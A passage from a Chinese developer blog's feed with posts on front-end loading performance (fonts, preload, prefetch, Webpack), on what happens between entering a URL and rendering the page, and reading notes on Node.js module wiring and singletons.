<code>GIF</code> 可以转化为视频，减少加载时间</li><li>使用 <code>Progressive JPEG</code>(这种加载时从低分辨率到高分辨率，从模糊到清晰) 代替传统的 <code>JPEG</code>(这种是 Baseline 的，从上加载到下，需要等待加载完才知道图片是啥)，更加具体的细节可以查看谷歌文档 <a href="https://developers.google.cn/web/fundamentals/performance/optimizing-content-efficiency/automating-image-optimization/?hl=zh-cn" target="_blank" rel="noopener">automating-image-optimization</a></li><li>视频使用 <code>preload=&quot;none&quot;</code> 来阻止预加载视频，有时可以使用 <code>GIF</code> 替换视频</li></ul><h2 id="JS-优化"><a href="#JS-优化" class="headerlink" title="JS 优化"></a>JS 优化</h2><ul><li>只发送用户需要的，可使用代码分割技术，例如 <code>webpack</code> 中的 <code>code-spliting</code>。</li><li>缩小，<code>UglifyJS</code> 缩小 <code>ES5</code> 的代码，使用 <code>babel-minify</code> 来缩小 <code>ES6</code> 及以上代码。</li><li>压缩，<code>GZIP</code>。</li><li>使用 <code>HTTP</code> 缓存。</li><li>加载第三方脚本可以使用 <code>async</code> 或者 <code>defer</code> 属性。</li><li>移除未引用的代码，<code>tree-shaking</code>。</li></ul><p><img src="/assets/img/async_defer.png" alt="aysnc-defer"></p><p>这里可以看到 <code>async</code> 与 <code>defer</code> 的区别，<code>async</code> 是使得脚本的下载和 <code>DOM</code> 的解析同时进行，当脚本下载好的时候立即停止 <code>DOM</code> 解析然后执行脚本；而 <code>defer</code> 虽然也是同时下载和解析，但是就算下载完成了也是需要等待 <code>DOM</code> 解析完成了才可以执行。</p><h2 id="字体优化"><a href="#字体优化" class="headerlink" title="字体优化"></a>字体优化</h2><ul><li>在构建渲染树之前会延迟字体请求，这可能会导致文本渲染延迟，<code>CSS</code> 已经下载完并与 <code>DOM</code> 共同构建渲染树，这个时候如果需要请求字体可能会阻塞渲染，产生了“空白文本问题”，出现该问题时，浏览器会在渲染网页布局时遗漏所有文本。</li><li>可以通过 <code>Font Loading API</code> 实现自定义字体加载和渲染策略，以替换默认延迟加载字体加载。</li><li>可以通过字体内联替换较旧浏览器中的默认延迟加载字体加载。</li></ul><h3 id="通过-Font-Loading-API-优化字体渲染"><a href="#通过-Font-Loading-API-优化字体渲染" class="headerlink" title="通过 Font Loading API 优化字体渲染"></a>通过 Font Loading API 优化字体渲染</h3><p><a href="https://drafts.csswg.org/css-font-loading/" target="_blank" rel="noopener">Font Loading API</a> 提供了一种脚本编程接口来定义和操纵 <code>CSS</code> 字体，追踪其下载进度，以及替换其默认延迟下载行为。例如，如果您确定将需要特定字体变体，您可以定义它并指示浏览器启动对字体资源的立即获取：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> font = <span class="keyword">new</span> FontFace(<span class="string">'Awesome Font'</span>, <span class="string">'url(/fonts/awesome.woff2)'</span>, &#123;</span><br><span class="line">  style: <span class="string">'normal'</span>,</span><br><span class="line">  unicodeRange: <span class="string">'U+000-5FF'</span>,</span><br><span class="line">  weight: <span class="string">'400'</span></span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">font.load() <span class="comment">// don't wait for the render tree, initiate an immediate fetch!</span></span><br><span class="line"></span><br><span class="line">font.ready().then(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="comment">// apply the font (which may re-render text and cause a page reflow)</span></span><br><span class="line">  <span class="comment">// after the font has finished downloading</span></span><br><span class="line">  <span class="built_in">document</span>.fonts.add(font)</span><br><span class="line">  <span class="built_in">document</span>.body.style.fontFamily = <span class="string">'Awesome Font, serif'</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// OR... by default the content is hidden,</span></span><br><span class="line">  <span class="comment">// and it's rendered after the font is available</span></span><br><span class="line">  <span class="keyword">var</span> content = <span class="built_in">document</span>.getElementById(<span class="string">'content'</span>)</span><br><span class="line">  content.style.visibility = <span class="string">'visible'</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// OR... apply your own render strategy here...</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h3 id="通过内联优化字体渲染"><a href="#通过内联优化字体渲染" class="headerlink" title="通过内联优化字体渲染"></a>通过内联优化字体渲染</h3><p>使用 <code>Font Loading API</code> 消除“空白文本问题”的简单替代策略是将字体内容内联到 <code>CSS</code> 样式表内：</p><ul><li>浏览器会使用高优先级自动下载具有匹配媒体查询的 <code>CSS</code> 样式表，因为需要使用它们来构建 <code>CSSOM</code>。</li><li>将字体数据内联到 <code>CSS</code> 样式表中会强制浏览器使用高优先级下载字体，而不等待渲染树。即它起到的是手动替换默认延迟加载行为的作用。</li></ul><h2 id="离线"><a href="#离线" class="headerlink" title="离线"></a>离线</h2><p>一些需要离线的资源(下次也能用上，如购物车)也可以考虑放到本地存储里，如 <code>localStorage</code>、<code>sessionStorage</code> 等等。</p><p>离线的图片可以使用 <code>Cache API</code> 来完成，详情查看 <a href="https://developers.google.cn/web/fundamentals/instant-and-offline/web-storage/cache-api?hl=zh-cn" target="_blank" rel="noopener">Using the Cache API</a>。</p><p>当数据量较大的时候，就可能用到 <code>IndexedDB</code> 来存储了。注意使用的时候需要注意并不是所有的类型都能写到 <code>IndexedDB</code> 中的，<code>IOS</code> 上的 <code>Safari</code> 是不能存储 <code>Blob</code> 类型的数据的，但是 <code>ArrayBuffer</code> 类型就是比较通用的了。写入可能失败，开发者需要意识到这一点，添加错误的监听函数。</p><h2 id="使用-CDN-加速"><a href="#使用-CDN-加速" class="headerlink" title="使用 CDN 加速"></a>使用 CDN 加速</h2><p>todo</p><h2 id="使用-HTTP-缓存"><a href="#使用-HTTP-缓存" class="headerlink" title="使用 HTTP 缓存"></a>使用 HTTP 缓存</h2><p>详情查看另一篇博客 <a href="/2018/08/09/前端基础之网络/#强缓存与协商缓存">前端基础之网络–强缓存与协商缓存</a>。</p><h2 id="关键路径渲染优化"><a href="#关键路径渲染优化" class="headerlink" title="关键路径渲染优化"></a>关键路径渲染优化</h2><p>详情查看另一篇博客 <a href="/2018/08/09/前端基础之关键路径渲染优化/index.html">前端基础之关键路径渲染优化</a>。</p><h2 id="PRPL-模式"><a href="#PRPL-模式" class="headerlink" title="PRPL 模式"></a>PRPL 模式</h2><p><code>PRPL</code> 是一种用于结构化和提供 <code>Progressive Web App</code> (<code>PWA</code>) 的模式，该模式强调应用交付和启动的性能。 它代表：</p><ul><li>推送 - 为初始网址路由推送关键资源。(Push critical resources for the initial route.)</li><li>渲染 - 渲染初始路由。(Render initial route.)</li><li>预缓存 - 预缓存剩余路由。(Pre-cache remaining routes.)</li><li>延迟加载 - 延迟加载并按需创建剩余路由。(Lazy-load and create remaining routes on demand.)</li></ul><p>像下面这种应用结构就很适合用 <code>RPRL</code> 模式：</p><ol><li>应用的主<em>进入点</em>从每个有效的路由提供。 此文件应非常小，它从不同网址提供，因此会被缓存多次。 进入点的所有资源网址都需要是绝对网址，因为它可以从非顶级网址提供。</li><li><code>Shell</code> 或 <code>App Shell</code>，包含顶级应用逻辑、路由器，等等。</li><li>延迟加载的应用 _片段_ 。片段可以表示特定视图的代码，或可延迟加载的其他代码（例如，首次绘制不需要的部分主应用，如用户与应用交互前未显示的菜单）。<code>Shell</code> 负责在需要时动态导入片段。</li></ol><p><img src="/assets/img/app-build-components.png" alt="app-build-components"></p><p>在此图表中，实线表示<em>静态依赖项</em>：使用 <code>&lt;link&gt;</code> 和 <code>&lt;script&gt;</code> 标记在文件中标识的外部资源。 虚线表示<em>动态</em>或<em>按需加载的依赖项</em>：根据 <code>Shell</code> 所需加载的文件。</p><p>构建过程会构建一个包含所有这些依赖项的图表，服务器会使用此信息高效地提供文件。 还会为不支持 <code>HTTP/2</code> 的浏览器构建一组硬化捆绑包。</p><h2 id="资源优先级"><a href="#资源优先级" class="headerlink" title="资源优先级"></a>资源优先级</h2><p>不是每个资源的都是同等重要的，浏览器加载资源有一定的优先级(例如 <code>CSS</code> 的加载优先级就比脚本和图片要高)。</p><h3 id="浏览器默认优先级"><a href="#浏览器默认优先级" class="headerlink" title="浏览器默认优先级"></a>浏览器默认优先级</h3><p>一般来说 <code>HTML</code> 和 <code>CSS</code> 有同样高的优先级(<code>Highest</code>)，而在 <code>head</code> 标签中的 <code>script</code> 标签的优先级就是 <code>High</code>，在 <code>body</code> 里最后时是 <code>Medium</code>，但是如加上了 <code>async</code> 属性那么优先级就会变成 <code>Low</code>，等等。具体的读者可以打开 <code>Chrome</code> 的开发者工具中的 <code>Network</code> 右键表头显示 <code>Priority</code> 查看网站加载资源优先级的详情，如图：</p><p><img src="/assets/img/chrome_priority.png" alt="resources priority"></p><p>那么当你发现资源的优先级和你预想的不一样该怎么办？这里提供三种解决方案，都是和新的 <code>&lt;link&gt;</code> 类型相关的。一方面，如果发现资源对用户是关键的，但是加载优先级却特别低，你可以使用 <code>preload</code> 或者 <code>preconnect</code> 来解决；另一方面，如果想要当其他所有资源都已经处理完毕再让浏览器去获取某些资源，可以使用 <code>prefetch</code>。</p><h3 id="Preload"><a href="#Preload" class="headerlink" title="Preload"></a>Preload</h3><p><code>&lt;link rel=&quot;preload&quot;&gt;</code> 告诉浏览器这个资源是当前页面所需要的，需要尽快获取。可以这么使用：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"preload"</span> <span class="attr">as</span>=<span class="string">"script"</span> <span class="attr">href</span>=<span class="string">"super-important.js"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"preload"</span> <span class="attr">as</span>=<span class="string">"style"</span> <span class="attr">href</span>=<span class="string">"critical.css"</span>&gt;</span></span><br></pre></td></tr></table></figure><p><code>as</code> 属性是用来告诉浏览器资源的类型(<strong>如果类型没有设置那么浏览器是不会拿这个资源来用的</strong>)。大部分基于标签的资源会被浏览器内部的预加载器（<a href="https://calendar.perfplanet.com/2013/big-bad-preloader/" target="_blank" rel="noopener">preloader</a>）提早发现，但并非所有资源都是基于标签的。有些资源是隐藏在 <code>CSS</code> 和 <code>JavaScript</code> 中的，浏览器不知道页面即将需要这些资源，而等到发现它们时已经为时已晚。所以在有些情况，这些资源延缓了首屏渲染，或是延缓了页面关键部分的加载。而 <code>preload</code> 就告诉浏览器当前页面一定会用到这个资源的，赶紧去获取。</p><blockquote><p>注意 <code>preload</code> 不会阻塞 <code>window.onload</code> 事件，除非该资源是被一个阻塞该事件的资源请求的。</p></blockquote><blockquote><p>加载该资源后，如果 3s 内还没有被当前页面使用，那么控制台会抛出一个警告，故而需要注意！！！</p></blockquote><p><img src="/assets/img/res-prio-timeout.png" alt="res-prio-timeout"></p><p><strong>使用场景：</strong></p><ul><li><p>较早加载字体<br>一种流行的“较晚发现关键资源”的代表是 <code>Web</code> 字体。一方面，它对页面渲染字体很关键（除非你在使用最新的 <code>font-display</code>）。另一方面，它们被埋在 <code>CSS</code> 很深的地方，很难发现。所以对一定需要的字体可以使用 <code>preload</code>:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"preload"</span> <span class="attr">as</span>=<span class="string">"font"</span> <span class="attr">crossorigin</span>=<span class="string">"crossorigin"</span> <span class="attr">type</span>=<span class="string">"font/woff2"</span> <span class="attr">href</span>=<span class="string">"myfont.woff2"</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>有一点需要指明，获取字体时必须加上 <code>crossorigin</code> 属性，就如使用 <code>CORS</code> 的匿名模式获取一样，即使你的字体与页面同域(否则会被浏览器忽略)。</strong></p></li><li><p>加载关键路径的 <code>CSS</code> 和 <code>JavaScript</code><br>关键路径资源是初始加载所必需的，虽然可以使用内联来达到及时加载的目的，但是却失去了缓存(<code>HTML</code> 是不缓存的，文件太大的话缓存的作用就不明显了)的优势和版本控制(修改关键路径的任何资源都导致整个页面更新，而如果是分开的资源则只需更新部分资源)的优势。</p></li></ul><h3 id="Preconnect"><a href="#Preconnect" class="headerlink" title="Preconnect"></a>Preconnect</h3><p><code>&lt;link rel=&quot;preconnect&quot;&gt;</code> 告诉浏览器你的页面将要与另一个域建立连接，并且想要这个过程尽快开始。</p><p>建立连接在慢网络中通常需要较多的时间来建立，尤其是安全连接时，包括了 <code>DNS</code> 查找、重定向、若干循环才找到能处理用户请求的服务器，不仅完成 <code>DNS</code> 预解析，同时还将进行 <code>TCP</code> 握手和建立传输层协议，而将这些操作提前能提升网页的性能和用户体验。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"preconnect"</span> <span class="attr">href</span>=<span class="string">"http://example.com"</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>尽量使用 <code>preload</code>，因为它是更为全面的性能提升。</p></blockquote><blockquote><p><code>dns-prefetch</code> 的浏览器支持度会好点，但是这个只是提前做了 <code>DNS</code> 查找，并不进行 <code>TCP</code> 握手和传输层协议的建立。</p></blockquote><p><strong>使用场景：</strong></p><ul><li>知道当前需要获取的资源在哪却不知道具体是什么资源</li><li>流媒体</li></ul><h3 id="Prefetch"><a href="#Prefetch" class="headerlink" title="Prefetch"></a>Prefetch</h3><p>不像 <code>preload</code> 和 <code>preconnect</code> 使用关键资源更早被获取或连接，<code>prefetch</code> 使得那些非关键的资源被下载(如果可能的话)。这个是优先级最低的，在 <code>Chrome</code> 中能看到是 <code>Lowest</code>。</p><p>一般预测用户下一步要干什么并提前准备好，比如加载某个列表的第一项、加载下一页(小说里比较常见).</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"prefetch"</span> <span class="attr">href</span>=<span class="string">"page-2.html"</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>注意 <code>prefetch</code> 不能覆盖，如果同时有一个正常请求的资源和一个 <code>prefetch</code> 的相同资源，那么这个资源会被加载两次，一个以高优先级下载，一个以低优先级下载。</p></blockquote><blockquote><p>预获取的资源没有同源限制！</p></blockquote><blockquote><p><code>subresources</code> 是另一个预获取资源的方式，只不过优先级更高，在所有的 <code>prefetch</code> 之前进行。<code>&lt;link rel=&quot;subresource&quot; href=&quot;styles.css&quot;&gt;</code>。</p></blockquote><h2 id="Webpack-优化加载性能"><a href="#Webpack-优化加载性能" class="headerlink" title="Webpack 优化加载性能"></a>Webpack 优化加载性能</h2><p>1.有效利用浏览器缓存：<code>code split</code>，如第三方库、<code>polyfill</code> 单独打包，分离公共库；<code>css</code> 单独提取出一个文件，<code>ExtractTextPlugin</code>。</p><p>2.懒加载：动态引入，<code>import</code>，注意可能需要使用 <code>babel</code> 的 <code>dynamic-webpack-import</code> 插件，不然编译会报错。</p><p>3.减少代码体积：<code>Minification</code>，使用 <code>UglifyJsPlugin</code> 来 <code>minify</code> 代码，生产环境相要对应上源代码需要同时设置 <code>devtool</code> 的值和 <code>UglifyJsPlugin</code> 的 <code>sourceMap</code> 为 <code>true</code>；使用 <code>babel-preset-env</code> 的 <code>useBuiltIns</code> 和 <code>target</code> 来共同控制需要 <code>shim</code> 的 <code>polyfill</code> 代码，尽量少加载垫片，比原来直接 <code>import &#39;babel-polyfill&#39;</code> 要少一部分的垫片；<code>tree-shaking</code> 来去除无用的代码。</p><p>4.图片压缩：使用 <code>image-webpack-loader</code> 来压缩图片，注意 <code>webp</code> 支持度较低，不建议使用。</p><p>5.分析包结构：使用 <code>BundleAnalyzerPlugin</code> 来分析打包后的包结构以及大小，便于后续的优化。</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;渲染性能&quot;&gt;&lt;a href=&quot;#渲染性能&quot; class=&quot;headerlink&quot; title=&quot;渲染性能&quot;&gt;&lt;/a&gt;渲染性能&lt;/h1&gt;&lt;h2 id=&quot;重绘重排&quot;&gt;&lt;a href=&quot;#重绘重排&quot; class=&quot;headerlink&quot; title=&quot;重绘重排&quot;&gt;&lt;/a&gt;重绘重排&lt;/h2&gt;&lt;p&gt;以下三种情况会导致网页重新渲染：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;修改 DOM&lt;/li&gt;
&lt;li&gt;修改样式表&lt;/li&gt;
&lt;li&gt;用户事件（比如鼠标悬停、页面滚动、输入框键入文字、改变窗口大小等等）&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
    
      <category term="前端" scheme="http://1016990109.github.io/tags/%E5%89%8D%E7%AB%AF/"/>
    
      <category term="性能优化" scheme="http://1016990109.github.io/tags/%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96/"/>
    
      <category term="浏览器" scheme="http://1016990109.github.io/tags/%E6%B5%8F%E8%A7%88%E5%99%A8/"/>
    
  </entry>
  
  <entry>
    <title>前端基础之从输入url到页面呈现的过程</title>
    <link href="http://1016990109.github.io/2018/08/02/%E5%89%8D%E7%AB%AF%E5%9F%BA%E7%A1%80%E4%B9%8B%E4%BB%8E%E8%BE%93%E5%85%A5url%E5%88%B0%E9%A1%B5%E9%9D%A2%E5%91%88%E7%8E%B0%E7%9A%84%E8%BF%87%E7%A8%8B/"/>
    <id>http://1016990109.github.io/2018/08/02/前端基础之从输入url到页面呈现的过程/</id>
    <published>2018-08-02T08:18:52.000Z</published>
    <updated>2018-09-08T09:20:58.894Z</updated>
    
    <content type="html"><![CDATA[<p>1.用户输入网址</p><p>2.浏览器通过 <code>DNS</code> 获取网站的 <code>IP</code> 地址。客户端先检查本地是否有对应的 <code>IP</code> 地址，若找到则返回响应的 <code>IP</code> 地址。若没找到则请求上级 <code>DNS</code> 服务器，直至找到或到根节点。</p><blockquote><p><code>DNS</code> 查找 <code>IP</code> 地址的顺序: 浏览器缓存、系统缓存、互联网服务提供商（<code>ISP</code>）的 <code>DNS</code> 缓存、递归搜索（从浏览器缓存开始，如果没找到就继续往下一个找）。找到后，浏览器会获得一个 <code>IP</code> 地址。</p></blockquote><a id="more"></a><p><code>DNS</code> 递归查询和迭代查询区别：</p><p><img src="/assets/img/dns.png" alt="DNS"></p><p>所谓递归查询就是：如果主机所询问的本地域名服务器不知道被查询的域名的 <code>IP</code> 地址，那么本地域名服务器就以 <code>DNS</code> 客户的身份，向其它根域名服务器继续发出查询请求报文(即替主机继续查询)，而不是让主机自己进行下一步查询。因此，递归查询返回的查询结果或者是所要查询的 <code>IP</code> 地址，或者是报错，表示无法查询到所需的 <code>IP</code> 地址。</p><p>迭代查询的特点：当根域名服务器收到本地域名服务器发出的迭代查询请求报文时，要么给出所要查询的 <code>IP</code> 地址，要么告诉本地服务器：“你下一步应当向哪一个域名服务器进行查询”。然后让本地服务器进行后续的查询。根域名服务器通常是把自己知道的顶级域名服务器的 <code>IP</code> 地址告诉本地域名服务器，让本地域名服务器再向顶级域名服务器查询。顶级域名服务器在收到本地域名服务器的查询请求后，要么给出所要查询的 <code>IP</code> 地址，要么告诉本地服务器下一步应当向哪一个权限域名服务器进行查询。最后，知道了所要解析的 <code>IP</code> 地址或报错，然后把这个结果返回给发起查询的主机。</p><blockquote><p>关于 <code>DNS</code> 的一些知识可以看看阮一峰老师的 <a href="http://www.ruanyifeng.com/blog/2018/05/root-domain.html" target="_blank" rel="noopener">根域名的知识</a> 和 <a href="http://www.ruanyifeng.com/blog/2016/06/dns.html" target="_blank" rel="noopener">DNS 原理入门</a></p></blockquote><p>3.浏览器客户端发送 <code>HTTP</code> 请求<br><code>HTTP</code> 请求包括请求报头和请求主体两个部分，其中请求报头包含了至关重要的信息，包括请求的方法（<code>GET</code> / <code>POST</code>）、目标 <code>url</code>、遵循的协议（<code>http</code> / <code>https</code> / <code>ftp</code> …），返回的信息是否需要缓存，以及客户端是否发送 <code>cookie</code> 等。</p><p>4.传输层 <code>TCP</code> 传输报文。<br><code>TCP</code> 协议通过“三次握手”等方法保证传输的安全可靠。</p><p>5.网络层 <code>IP</code> 协议查询 <code>MAC</code> 地址<br><code>IP</code> 协议的作用是把 <code>TCP</code> 分割好的各种数据包传送给接收方。而要保证确实能传到接收方还需要接收方的 <code>MAC</code> 地址，也就是物理地址。<code>IP</code> 地址和 <code>MAC</code> 地址是一一对应的关系，一个网络设备的 <code>IP</code> 地址可以更换，但是 <code>MAC</code> 地址一般是固定不变的。<code>ARP</code> 协议可以将 <code>IP</code> 地址解析成对应的 <code>MAC</code> 地址。当通信的双方不在同一个局域网时，需要多次中转才能到达最终的目标，在中转的过程中需要通过下一个中转站的 <code>MAC</code> 地址来搜索下一个中转目标。</p><p>6.数据到达数据链路层<br>在找到对方的 <code>MAC</code> 地址后，就将数据发送到数据链路层传输。这时，客户端发送请求的阶段结束。</p><p>7.服务器接收数据<br>接收端的服务器在链路层接收到数据包，再层层向上直到应用层。这过程中包括在运输层通过 <code>TCP</code> 协议将分段的数据包重新组成原来的 <code>HTTP</code> 请求报文。</p><p>8.服务器响应请求<br>服务接收到客户端发送的 <code>HTTP</code> 请求后，查找客户端请求的资源，并返回响应报文，响应报文中包括一个重要的信息——状态码。状态码由三位数字组成，其中比较常见的是:</p><p><code>200 OK</code> 表示请求成功。<br><code>301 Moved Permanently</code> 表示永久重定向，即请求的资源已经永久转移到新的位置。在返回 <code>301</code> 状态码的同时，响应报文也会附带重定向的 <code>url</code>，客户端接收到后将 <code>http</code> 请求的 <code>url</code> 做相应的改变再重新发送。<br><code>302</code> 是暂时重定向，对用户来说没有区别，只是对搜索引擎有区别，具体可查看 <a href="https://www.jianshu.com/p/995a3000f7d6" target="_blank" rel="noopener">https://www.jianshu.com/p/995a3000f7d6</a>。<br><code>404 Not Found</code> 表示客户端请求的资源找不到。<br><code>400 Bad Request</code>，客户端请求语法错误，一般是参数错了。<br><code>401 Unauthorized</code>，需要用户认证，一般未登录。<br><code>403 Forbidden</code>，拒绝请求，可能是没权限。<br><code>405 Method Not Allowed</code>，方法错了。<br><code>500</code>，服务器错误，一般是服务器抛异常。<br><code>501 Not Implemented</code>，服务器还没实现这个功能。<br><code>502 Bad Gateway</code>，网关错误，可能是网关与后端服务连接断了。<br><code>503 Service Unavailable</code>，服务暂不可用，系统维护。<br><code>504 Gateway Time-out</code>，网关超时，后端处理太久还没返回，网关直接返回 <code>504</code>。</p><p>9.服务器返回响应文件<br>请求成功后，服务器会返回相应的 <code>HTML</code> 文件。接下来就到了页面的渲染阶段了。</p><p>10.页面渲染：  解析 <code>HTML</code> 以构建 <code>DOM</code> 树 –&gt; 构建渲染树 –&gt; 布局渲染树 –&gt; 绘制渲染树。<br>关于页面渲染过程：<br>1）解析 <code>HTML</code> 代码，生成一棵 <code>DOM</code> 树<br>2）解析 <code>CSS</code> 文件<br>3）生成渲染树（受样式影响，不包含不可见元素）<br>4）渲染树中的节点</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;1.用户输入网址&lt;/p&gt;
&lt;p&gt;2.浏览器通过 &lt;code&gt;DNS&lt;/code&gt; 获取网站的 &lt;code&gt;IP&lt;/code&gt; 地址。客户端先检查本地是否有对应的 &lt;code&gt;IP&lt;/code&gt; 地址，若找到则返回响应的 &lt;code&gt;IP&lt;/code&gt; 地址。若没找到则请求上级 &lt;code&gt;DNS&lt;/code&gt; 服务器，直至找到或到根节点。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;DNS&lt;/code&gt; 查找 &lt;code&gt;IP&lt;/code&gt; 地址的顺序: 浏览器缓存、系统缓存、互联网服务提供商（&lt;code&gt;ISP&lt;/code&gt;）的 &lt;code&gt;DNS&lt;/code&gt; 缓存、递归搜索（从浏览器缓存开始，如果没找到就继续往下一个找）。找到后，浏览器会获得一个 &lt;code&gt;IP&lt;/code&gt; 地址。&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
    
      <category term="前端" scheme="http://1016990109.github.io/tags/%E5%89%8D%E7%AB%AF/"/>
    
  </entry>
  
  <entry>
    <title>《Node.js 设计模式》读书笔记 第七章</title>
    <link href="http://1016990109.github.io/2018/07/28/Node-js-%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0-%E7%AC%AC%E4%B8%83%E7%AB%A0/"/>
    <id>http://1016990109.github.io/2018/07/28/Node-js-设计模式读书笔记-第七章/</id>
    <published>2018-07-28T15:36:33.000Z</published>
    <updated>2018-08-02T08:13:28.239Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Wiring-Modules-连接模块"><a href="#Wiring-Modules-连接模块" class="headerlink" title="Wiring Modules(连接模块)"></a>Wiring Modules(连接模块)</h1><p>对模块常见的一个问题就是：将组件 X 的实例传递到模块 Y 的最佳方式是什么？</p><p>常见的模式有一下几种：</p><ul><li>硬编码依赖</li><li>依赖注入</li><li>服务定位器</li><li>依赖注入容器</li></ul><a id="more"></a><h2 id="Modules-and-dependencies-模块和依赖"><a href="#Modules-and-dependencies-模块和依赖" class="headerlink" title="Modules and dependencies(模块和依赖)"></a>Modules and dependencies(模块和依赖)</h2><h3 id="The-most-common-dependency-in-Node-js-Node-js-中最常见的模块"><a href="#The-most-common-dependency-in-Node-js-Node-js-中最常见的模块" class="headerlink" title="The most common dependency in Node.js(Node.js 中最常见的模块)"></a>The most common dependency in Node.js(Node.js 中最常见的模块)</h3><p>一个模块的属性可以概括如下：</p><ul><li>一个模块应该具有可读性和可理解性，因为它应该专注于一件事。</li><li>一个模块被表示为一个单独的文件，使得其更容易被识别。</li><li>模块可以更容易地在不同的应用程序中复用。</li></ul><h3 id="Cohesion-and-coupling-内聚和耦合"><a href="#Cohesion-and-coupling-内聚和耦合" class="headerlink" title="Cohesion and coupling(内聚和耦合)"></a>Cohesion and coupling(内聚和耦合)</h3><p>评判创建的模块平衡性两个最重要的特征就是内聚度和耦合度。这两个特征可以应用于软件体系结构中的任何类型的组件或子系统。因此在构建 <code>Node.js</code> 模块时也可以把这两个特征作为重要的参考价值。这两个属性定义如下：</p><p>内聚度：用于度量模块内部功能之间的相关性。例如，对于一个只做一件事的模块，其中的所有部件都只对这一件事起作用，那说明这个模块具有很高的内聚度。举个例子，那种包含把任何类型的对象存储到数据库的函数内聚度就较低，如 <code>saveProduct()</code>、<code>saveInvoice()</code>、<code>saveUser()</code> 等。</p><p>耦合度：评判模块对系统其他模块的依赖程度。例如，当一个模块直接读取或修改另一个模块的数据时，该模块与另一个模块是紧密耦合的；另外，通过全局或共享状态交互的两个模块也是紧密耦合的；另一方面，仅通过参数传递进行通信的两个模块耦合度较低。</p><p>理想情况下，一个模块应该具有较高的内聚度和较低的耦合度，这样的模块更易于理解、重用和扩展。</p><h3 id="Stateful-modules-有状态的模块"><a href="#Stateful-modules-有状态的模块" class="headerlink" title="Stateful modules(有状态的模块)"></a>Stateful modules(有状态的模块)</h3><p>在 <code>JavaScript</code> 中，将接口与实现分离的例子很少。 然而，通过使用 <code>Node.js</code> 模块系统，我们引入了一个特定的模块，接口不会受到其它模块的影响。在正常情况下，这没有什么问题，但是如果我们使用 <code>require()</code> 来加载一个导出有状态实例的模块，比如数据库交互对象，<code>HTTP</code> 服务器实例，乃至普通的任何对象这不是无状态的，我们实际上是在引用的模块都是一个又一个的单例，因此模块系统有着单例模式的优点和缺点，此外，也有一些不同的地方。</p><h4 id="The-Singleton-pattern-in-Node-js-Node-js-中的单例模式"><a href="#The-Singleton-pattern-in-Node-js-Node-js-中的单例模式" class="headerlink" title="The Singleton pattern in Node.js(Node.js 中的单例模式)"></a>The Singleton pattern in Node.js(Node.js 中的单例模式)</h4><p>在 <code>Node.js</code> 中其实单例很简单，在 <code>export</code> 的过程中就完成了：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//'db.js' module</span></span><br><span class="line"><span class="built_in">module</span>.exports = <span class="keyword">new</span> Database(<span class="string">'my-app-db'</span>)</span><br></pre></td></tr></table></figure><p>因为在第一次 <code>require</code> 之后就会把模块缓存下来，之后只会返回缓存的实例。但是这不是一定是单例的，有可能有多个包都含有这个 <code>db</code> 依赖，那么就会有多个实例出来，例如这样的依赖结构：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">app/</span><br><span class="line">   `-- node_modules</span><br><span class="line">       |-- packageA</span><br><span class="line">       |  `-- node_modules</span><br><span class="line">       |      `-- mydb</span><br><span class="line">       `-- packageB</span><br><span class="line">           `-- node_modules</span><br><span class="line">               `-- mydb</span><br></pre></td></tr></table></figure><p>这个时候可以赋予实例给全局变量来达到真正单例的效果(<strong>通常不这么做</strong>，这是比较危险的)。</p><h2 id="Patterns-for-wiring-modules-连接模块的模式"><a href="#Patterns-for-wiring-modules-连接模块的模式" class="headerlink" title="Patterns for wiring modules(连接模块的模式)"></a>Patterns for wiring 